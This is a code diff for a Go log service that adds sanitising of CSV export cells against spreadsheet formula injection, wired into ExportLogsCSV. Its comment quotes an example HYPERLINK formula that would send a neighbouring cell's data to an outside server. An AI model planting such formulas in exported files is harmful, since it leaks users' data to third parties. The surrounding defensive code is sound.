@@ -165,6 +165,40 @@ func (s *LogQueryService) GetErrorGroups(ctx context.Context, projectID uuid.UUI
 	return groups, nil
 }
 
+// csvSafeRow neutralises cells a spreadsheet would run rather than display.
+//
+// Excel, Sheets and LibreOffice all treat a cell beginning =, +, - or @ as a
+// formula, and a log message is attacker-influenced text: whatever a user typed
+// into a search box, a username, a string an API echoed back. Exported and
+// opened, `=HYPERLINK("http://…"&A1,"ok")` quietly ships the row next to it to
+// someone else's server, and the older DDE forms go further.
+//
+// A leading apostrophe is the standard answer: spreadsheets read it as "this is
+// text" and do not display it. Applied to every column rather than the free
+// text ones, because a uuid, an RFC3339 timestamp and a bool cannot begin with
+// any of these characters, so it costs nothing and cannot be forgotten when a
+// column is added.
+func csvSafeRow(row []string) []string {
+	for i, cell := range row {
+		row[i] = csvSafeCell(cell)
+	}
+	return row
+}
+
+func csvSafeCell(cell string) string {
+	if cell == "" {
+		return cell
+	}
+	switch cell[0] {
+	// Tab and carriage return are here because a spreadsheet skips them and
+	// reads what follows, so they smuggle a formula past a check on the first
+	// character alone.
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + cell
+	}
+	return cell
+}
+
 // ExportLogsCSV streams logs as CSV to the provided writer.
 func (s *LogQueryService) ExportLogsCSV(ctx context.Context, projectID uuid.UUID, query string, w io.Writer) error {
 	log := cslog.L(ctx)
@@ -224,7 +258,7 @@ func (s *LogQueryService) ExportLogsCSV(ctx context.Context, projectID uuid.UUID
 				meta = string(*l.Metadata)
 			}
 
-			if err := csvWriter.Write([]string{
+			if err := csvWriter.Write(csvSafeRow([]string{
 				l.ID.String(),
 				l.SessionID.String(),
 				l.Level,
@@ -236,7 +270,7 @@ func (s *LogQueryService) ExportLogsCSV(ctx context.Context, projectID uuid.UUID
 				phase,
 				tags,
 				meta,
-			}); err != nil {
+			})); err != nil {
 				return err
 			}
 		}
